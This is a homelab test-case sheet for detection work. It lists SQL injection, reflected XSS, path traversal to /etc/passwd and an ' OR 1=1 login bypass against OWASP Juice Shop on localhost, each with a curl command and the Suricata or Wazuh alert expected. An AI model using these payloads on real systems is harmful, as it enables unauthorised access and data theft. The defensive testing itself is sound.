# Web Application Security Test Cases: OWASP Juice Shop

This document specifies reproducible test cases for simulating web application attack vectors against OWASP Juice Shop.

---

## Test Case 1: SQL Injection (SQLi) - Product Search Filter

- **Category**: Injection ([OWASP A03:2021](https://owasp.org/Top10/A03_2021-Injection/))
- **MITRE ATT&CK**: T1190
- **HTTP Method**: `GET`
- **Target URL**: `http://127.0.0.1:3000/rest/products/search`
- **Payload**: `')) UNION SELECT 1,2,3,4,5,6,7,8,9--`
- **Curl Command**:
  ```bash
  curl -s -i -G "http://127.0.0.1:3000/rest/products/search" \
    --data-urlencode "q=')) UNION SELECT 1,2,3,4,5,6,7,8,9--"
  ```
- **Expected Application Response**: HTTP `200 OK` with JSON array containing injected dummy schema rows.
- **Expected NIDS Telemetry**:
  - Suricata Rule: `1000002` (`HOMELAB WEB SQL Injection Attempt - UNION SELECT`)
  - Log Destination: `/var/log/suricata/eve.json`

---

## Test Case 2: Cross-Site Scripting (XSS) - Reflected Parameter

- **Category**: Injection / Cross-Site Scripting
- **MITRE ATT&CK**: T1059.007 (JavaScript)
- **HTTP Method**: `GET`
- **Target URL**: `http://127.0.0.1:3000/rest/track-order/`
- **Payload**: `<iframe src="javascript:alert('Homelab-XSS')">`
- **Curl Command**:
  ```bash
  curl -s -i "http://127.0.0.1:3000/rest/track-order/%3Ciframe%20src%3D%22javascript:alert('Homelab-XSS')%22%3E"
  ```
- **Expected Application Response**: HTTP `200 OK` or `400` reflecting the unescaped script tag in response body.
- **Expected Detection**: Web server log entry showing suspicious script URI encoding.

---

## Test Case 3: Path / Directory Traversal

- **Category**: Broken Access Control ([OWASP A01:2021](https://owasp.org/Top10/A01_2021-Broken_Access_Control/))
- **MITRE ATT&CK**: T1083 (File and Directory Discovery)
- **HTTP Method**: `GET`
- **Target URL**: `http://127.0.0.1:3000/ftp`
- **Payload**: `../../etc/passwd`
- **Curl Command**:
  ```bash
  curl -s -i "http://127.0.0.1:3000/ftp/..%2f..%2f..%2fetc%2fpasswd"
  ```
- **Expected Application Response**: HTTP `403 Forbidden` or `500` error from traversal filter.
- **Expected NIDS Telemetry**:
  - Suricata Rule: `1000003` (`HOMELAB WEB Directory Traversal Attempt (../)`)

---

## Test Case 4: Authentication Bypass via SQLi

- **Category**: Identification and Authentication Failures
- **HTTP Method**: `POST`
- **Target URL**: `http://127.0.0.1:3000/rest/user/login`
- **Payload**:
  ```json
  {"email": "' OR 1=1--", "password": "password123"}
  ```
- **Curl Command**:
  ```bash
  curl -s -i -X POST "http://127.0.0.1:3000/rest/user/login" \
    -H "Content-Type: application/json" \
    -d '{"email": "\x27 OR 1=1--", "password": "password123"}'
  ```
- **Expected Application Response**: HTTP `200 OK` with JSON web token (admin session established).
- **Expected Detection**: Suricata authentication anomaly or Wazuh HTTP payload analysis.
